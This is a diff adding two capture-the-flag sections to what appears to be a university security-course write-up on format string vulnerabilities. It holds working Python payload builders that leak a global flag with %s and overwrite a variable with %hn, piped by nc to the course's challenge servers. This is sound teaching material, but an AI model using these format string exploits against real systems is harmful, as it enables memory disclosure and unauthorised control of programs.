@@ -175,6 +175,132 @@ $ ./build_string.py && cat badfile | nc 10.9.0.5 9090
 server-10.9.0.5 | The target variable's value (after): 0x00005000
 ```
 
+## CTF 1
+
+We start by verifying what kind of protects the given program has:
+
+```sh
+$ checksec program
+Arch:     i386-32-little
+RELRO:    Partial RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      No PIE (0x8048000)
+```
+
+Since there is a canary and the stack is not executable, a buffer overflow like
+we did in previous labs is a lot harder. We should look for other
+vulnerabilities. We found the following line of code:
+
+```c
+printf(buffer);
+```
+
+We see that *buffer*, which is input controlled by the user, is in the format
+string parameter of printf, therefore we can do some damage here. Also, since
+the flag is in a global variable, it will be trivial to exploit this, just need
+to put the address of where this flag is stored at the top of the stack and
+then use "%s" in the format string payload to read it.
+
+```sh
+$ objdump -t program | grep flag
+0804c060 g     O .bss    00000028    flag
+```
+
+Not that we have the address to read, just need to write the script.
+
+```py
+N = 32
+content = bytearray(0x0 for i in range(N))
+
+flag = 0x0804c060 
+content[0:4] = (flag).to_bytes(4,byteorder='little')
+
+s = "%s"
+fmt  = (s).encode('latin-1')
+content[4:4+len(fmt)] = fmt
+
+with open('payload', 'wb') as f:
+  f.write(content)
+```
+
+And let's test it:
+
+```sh
+$ cat payload | nc ctf-fsi.fe.up.pt 4004
+Try to unlock the flag.
+Show me what you got:You gave me this: `flag{...}
+
+Disqualified!
+```
+
+And we get the flag!
+
+## CTF 2
+
+We start by verifying what kind of protects the given program has:
+
+```sh
+$ checksec program
+Arch:     i386-32-little
+RELRO:    Partial RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      No PIE (0x8048000)
+```
+
+We get similar results to the last CTF, so we will look for format string
+vulnerabilities again.
+
+```c
+printf(buffer);
+```
+
+Once again, we find this vulnerable line of code. Although this time,
+exploiting won't be as straight forward as the last time. There seems to be
+a variable *key* which we need to overwrite to equal to 0xbeef. Seems simple
+enough. Let's first find out the address of *key*:
+
+```sh
+$ objdump -t program | grep key
+0804c034 g     O .bss    00000004    key
+```
+
+Now, instead of reading from this address like we did in the previous CTF, we
+need to write to it. For this we will perform a short write using "%hn", making
+sure to print 0xbeef bytes before it.
+
+```py
+#!/usr/bin/python3
+
+N = 32
+content = bytearray(0x0 for i in range(N))
+
+key = 0x0804c034
+content[0:4] = "JUNK".encode('latin-1')
+content[4:8] = (key).to_bytes(4,byteorder='little')
+
+s = "%48871u%hn"
+fmt  = (s).encode('latin-1')
+content[8:8+len(fmt)] = fmt
+
+with open('payload', 'wb') as f:
+    f.write(content)
+```
+
+We prepend "JUNK" to our payload so that our address does not get stolen by the
+"%u", which is used just for padding. Let's try it:
+
+```sh
+$ (cat payload;cat) | nc ctf-fsi.fe.up.pt 4005
+(...)
+Backdoor activated
+cat flag.txt
+flag{...}
+```
+
+And we got it!
+
 ## Extra CTF - FinalFormat
 
 From the name of the challenge we already suspect we are facing a format string
